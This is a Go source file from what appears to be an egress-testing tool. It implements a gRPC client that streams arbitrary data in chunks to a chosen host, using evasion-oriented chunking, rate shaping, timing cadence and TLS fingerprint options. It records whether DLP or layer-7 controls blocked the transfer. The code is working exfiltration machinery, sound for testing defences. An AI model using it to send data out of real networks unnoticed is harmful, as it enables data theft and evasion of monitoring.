package web

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
	"github.com/shehzade/contraband/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/metadata"
)

type GRPCExfiltrator struct{}

func NewGRPCExfiltrator() *GRPCExfiltrator {
	return &GRPCExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoGRPC, NewGRPCExfiltrator())
}

func (e *GRPCExfiltrator) Protocol() string {
	return common.ProtoGRPC
}

func (e *GRPCExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.TLSProfile = opts.TLSFingerprint
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.TotalBytes <= 0 {
		if br, ok := reader.(*bytes.Reader); ok {
			opts.TotalBytes = int64(br.Len())
		} else if bb, ok := reader.(*bytes.Buffer); ok {
			opts.TotalBytes = int64(bb.Len())
		}
	}

	if opts.ExpectedHash == "" {
		if br, ok := reader.(*bytes.Reader); ok {
			cur, _ := br.Seek(0, io.SeekCurrent)
			h := sha256.New()
			_, _ = io.Copy(h, br)
			opts.ExpectedHash = hex.EncodeToString(h.Sum(nil))
			_, _ = br.Seek(cur, io.SeekStart)
		}
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()

	totalChunks := uint32(chunker.TotalChunks())
	result.TargetVolume = opts.TotalBytes

	isTLS := opts.UseTLS || (opts.TargetPort != 80 && opts.InsecureTLS) || opts.TargetPort == 443 || opts.TargetPort == 8443 || opts.TargetPort == 9443 || opts.TargetPort == 10443
	targetAddr := fmt.Sprintf("%s:%d", opts.TargetHost, opts.TargetPort)

	var dialOpts []grpc.DialOption
	if isTLS {
		tlsCfg := exfil.TLSConfig{
			ServerName:         opts.TargetHost,
			InsecureSkipVerify: opts.InsecureTLS,
			Fingerprint:        opts.TLSFingerprint,
			ALPN:               []string{"h2"},
		}
		dialOpts = append(dialOpts, grpc.WithTransportCredentials(exfil.NewGRPCTransportCredentials(tlsCfg)))
	} else {
		dialOpts = append(dialOpts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}

	conn, err := grpc.NewClient(targetAddr, dialOpts...)
	if err != nil {
		result.Verdict = common.ClassifyError(err)
		result.ErrorMessage = fmt.Sprintf("grpc dial failed: %v", err)
		result.Timestamps.TeardownDone = time.Now().UTC()
		e.calculateDurations(&result)
		return &result, err
	}
	defer conn.Close()

	client := proto.NewExfilServiceClient(conn)

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	if isTLS {
		result.Timestamps.HandshakeTLS = time.Now().UTC()
	}
	result.Timestamps.FirstByteSent = time.Now().UTC()

	mdMap := make(map[string]string)
	for k, v := range opts.Headers {
		mdMap[strings.ToLower(k)] = v
	}
	if _, ok := mdMap[strings.ToLower(common.HeaderProtocol)]; !ok {
		mdMap[strings.ToLower(common.HeaderProtocol)] = common.ProtoGRPC
	}
	ctx = metadata.NewOutgoingContext(ctx, metadata.New(mdMap))

	stream, err := client.UploadStream(ctx)
	if err != nil {
		result.Verdict = common.ClassifyError(err)
		result.ErrorMessage = fmt.Sprintf("failed to open grpc upload stream: %v", err)
		result.Timestamps.TeardownDone = time.Now().UTC()
		e.calculateDurations(&result)
		return &result, err
	}

	var headEvidence []byte
	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = err.Error()
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}

		if len(headEvidence) < 768 && len(chunkFrame) > common.ChunkHeaderSize {
			p := chunkFrame[common.ChunkHeaderSize:]
			needed := 768 - len(headEvidence)
			if needed > len(p) {
				needed = len(p)
			}
			headEvidence = append(headEvidence, p[:needed]...)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = common.ClassifyError(err)
				result.ErrorMessage = err.Error()
				result.Timestamps.TeardownDone = time.Now().UTC()
				e.calculateDurations(&result)
				return &result, err
			}
		}

		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = common.ClassifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					result.Timestamps.TeardownDone = time.Now().UTC()
					e.calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		rawChunk := chunkFrame
		if len(chunkFrame) >= common.ChunkHeaderSize {
			rawChunk = chunkFrame[common.ChunkHeaderSize:]
		}

		req := &proto.ChunkRequest{
			Token:        opts.SessionToken[:],
			Sequence:     seq,
			TotalChunks:  totalChunks,
			Payload:      rawChunk,
			ExpectedHash: opts.ExpectedHash,
		}

		if err := stream.Send(req); err != nil {
			result.Verdict = common.ClassifyError(err)
			result.ErrorMessage = fmt.Sprintf("grpc stream send failed at seq %d: %v", seq, err)
			result.Timestamps.TeardownDone = time.Now().UTC()
			e.calculateDurations(&result)
			return &result, err
		}
		result.BytesSent += int64(len(rawChunk))
	}

	resp, err := stream.CloseAndRecv()
	if err != nil {
		result.Verdict = common.ClassifyError(err)
		result.ErrorMessage = fmt.Sprintf("grpc stream receive ack failed: %v", err)
		result.Timestamps.TeardownDone = time.Now().UTC()
		e.calculateDurations(&result)
		return &result, err
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()

	if !resp.Success {
		if resp.Verdict != "" {
			result.Verdict = common.Verdict(resp.Verdict)
		} else {
			result.Verdict = common.VerdictBlockedL7
		}
		result.ErrorMessage = resp.ErrorMessage
		e.calculateDurations(&result)
		return &result, fmt.Errorf("grpc server rejected exfiltration: %s", resp.ErrorMessage)
	}

	if opts.ExpectedHash != "" && !strings.EqualFold(resp.PayloadHash, opts.ExpectedHash) {
		result.Verdict = common.VerdictBlockedDLP
		result.ErrorMessage = fmt.Sprintf("cryptographic hash mismatch: expected %s, got %s", opts.ExpectedHash, resp.PayloadHash)
		e.calculateDurations(&result)
		return &result, fmt.Errorf("%s", result.ErrorMessage)
	}

	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	e.calculateDurations(&result)
	return &result, nil
}

func (e *GRPCExfiltrator) calculateDurations(r *common.ProbeResult) {
	t := &r.Timestamps
	if t.TeardownDone.IsZero() {
		t.TeardownDone = time.Now().UTC()
	}
	t.ComputeDurations()
	if t.TransferDuration > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(t.TransferDuration) / float64(time.Second)) / 1000.0
	}
}
